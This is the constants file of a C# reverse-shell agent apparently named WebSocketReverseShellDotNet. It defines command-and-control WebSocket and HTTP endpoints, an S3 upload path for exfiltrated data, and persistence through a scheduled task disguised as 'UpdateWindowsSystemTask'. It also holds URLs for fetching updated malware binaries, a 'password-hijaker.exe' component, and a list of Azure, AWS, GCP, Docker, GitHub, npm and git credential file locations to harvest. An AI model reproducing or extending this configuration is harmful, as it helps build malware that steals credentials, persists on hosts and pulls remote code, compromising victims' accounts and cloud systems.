using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WebSocketReverseShellDotNet.utils
{
    internal static class Constants
    {
        public const String SERVER_WEBSOCKET_URI = "ws://127.0.0.1:8070/reverseShellClients" ;
        public const String SERVER_HTTP_URI = "http://127.0.0.1:8070" ;

        //public const String SERVER_WEBSOCKET_URI = "wss://c2-server.mtattab.com/reverseShellClients" ;
        //public const String SERVER_HTTP_URI = "https://c2-server.mtattab.com" ;



        public const String S3_API_ENDPOINT = "/v1/api/s3";

        public const String S3_API_UPLOAD = "/upload";


        public const String S3_API_UPLOAD_SESSION_PARAM = "?sessionId=";


        public const String PERSISTENCE_WINDOWS_TASK = "UpdateWindowsSystemTask";

        public const String LOCK_FILE_NAME = "93803181808-lock";

        public const String JFROG_BASE_URL= "https://mhattab.jfrog.io/artifactory/libs-release-local/com/mtattab/reverseshell/reverseShell/";
        public const String UPDATED_MALWARE_URL= "https://c2-binaries.s3.us-east-2.amazonaws.com/reverseShell-1.0.1-zip.zip";

        public const String JFROG_META_DATA_FILE= "maven-metadata.xml";


        public const String JFROG_LATEST_AGENT_PATH= "%s/reverseShell-%s-zip.zip";

        public const String JFROG_LATEST_REGEX= "<latest>(.*?)<\\/latest>";

        public const String EXFILTRATE_FOLDER = ".exfiltrate";
        public const String NEW_AGENT_DIRECTORY= ".agent";
        public const String CUSTOM_SCRIPT_DIRECTORY = ".scripts";

        public const String PASSWORD_HIJACKER = "password-hijaker.exe";
        public const String RICK_ROLL = "WebSocketReverseShellDotNet.rick-roll-bass-boosted.mp3";

        public static string[] LIST_OF_CRED_LOCATIONS = [
            "%USERPROFILE%\\.azure\\azureProfile.json",
            "%USERPROFILE%\\.azure\\accessTokens.json",
            "%USERPROFILE%\\.docker\\config.json",
            "%APPDATA%\\gh\\config.yml",
            "%UserProfile%\\.aws\\credentials",
            "%UserProfile%\\.aws\\config",
            "%UserProfile%\\.okta\\okta.yaml",
            "%USERPROFILE%\\.netrc",
            "%USERPROFILE%\\.git-credentials",
            "%USERPROFILE%\\.npmrc",
            "%APPDATA%\\gcloud\\credentials.db",
            "%APPDATA%\\gcloud\\application_default_credentials.json",
            "%USERPROFILE%\\.oci\\config",
            "%GOOGLE_APPLICATION_CREDENTIALS%",

        ];


    }
}
